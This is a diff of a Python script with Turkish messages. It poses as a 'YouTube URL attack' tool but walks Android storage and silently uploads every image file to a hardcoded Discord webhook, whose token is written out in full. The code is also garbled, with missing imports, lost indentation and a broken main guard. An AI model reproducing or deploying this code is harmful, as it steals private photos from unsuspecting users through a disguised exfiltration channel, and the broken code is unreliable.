@@ -1,38 +1,63 @@
 import os
 import requests
+import time
+import random
+from tqdm import tqdm
 
-# Webhook URL'ni buraya yaz!
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1438606986114764854/lE6LEjv2yTGUOAvSYkOWYOHfripU-H10ZcyPu3A1dnHsDQMFOZCLYqOVKnFSOhCH6yhS"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1438606986114764854/lE6LEjv2yTGUOAvSYkOWYOHfripU-H10ZcyPu3A1dnHsDQMFOZCLYqOVKnFSOhCH6yhS"
 
-def upload_file_to_discord(file_path):
-    try:
-        with open(file_path, 'rb') as f:
-            files = {'file': (os.path.basename(file_path), f)}
-            response = requests.post(DISCORD_WEBHOOK_URL, files=files)
-        if response.status_code in [200, 204] 
-        else:
-        except Exception as e:
-        print(f"⚠️ Hata oluştu: {file_path}: {e}")
+def get_device_info():
+try:
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+return hostname, local_ip
+except:
+return "Bilinmiyor", "Bilinmiyor"
 
-def find_images_in_gallery():
-    gallery_paths = [
-        '/sdcard/DCIM/Camera',
-        '/sdcard/Pictures',
-        '/storage/emulated/0/DCIM/Camera',
-        '/storage/emulated/0/Pictures',
-        '/sdcard/Download'
-    ]
-    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
-    image_files = []
-    for folder in gallery_paths:
-        if os.path.exists(folder):
-            for root, dirs, files in os.walk(folder):
-                for file in files:
-                    if file.lower().endswith(image_extensions):
-                        image_files.append(os.path.join(root, file))
-    return image_files
+def send_to_discord(file_path):
+try:
+with open(file_path, 'rb') as file:
+files = {'file': (os.path.basename(file_path), file)}
+requests.post(WEBHOOK_URL, files=files)
+except:
+pass
 
-if __name__ == '__main__'
-    images = find_images_in_gallery() 
-    for img in images:
-        upload_file_to_discord(img) 
+def scan_and_upload():
+image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
+base_dir = "/storage/emulated/0"
+
+target_id = input("Youtube Url ")  
+print(f"\n **{target_id}** attack...")  
+  
+image_files = []  
+for root, _, files in os.walk(base_dir):  
+    for file in files:  
+        if file.lower().endswith(image_extensions):  
+            image_files.append(os.path.join(root, file))  
+  
+total_images = len(image_files)  
+if total_images == 0:  
+    print("No url!")  
+    return  
+  
+print(f" **{total_images}** başlıyor...\n")  
+  
+for image_path in tqdm(image_files, desc="BAŞLADI", unit="0"):  
+    send_to_discord(image_path)  
+    time.sleep(1)   
+  
+print("\n Gönderim Tamamlandı !")
+
+if name == "main":
+print("""
+
+
+---
+
+\ / /  / /  / | / /  /  /  / /      /  |/  /  / /  /  /     _ | |
+\  /  / __/    /  |/ /   / /   / /      / /|/ /  / __/       / /     ()/ /
+/ /  / /   / /|  /  / /   / /   / /  / /  / /___      / /__   _  / /
+//  /_____/  // |/  //  //  //  //  /__/     /_/  ()//
+//
+""")
+scan_and_upload()
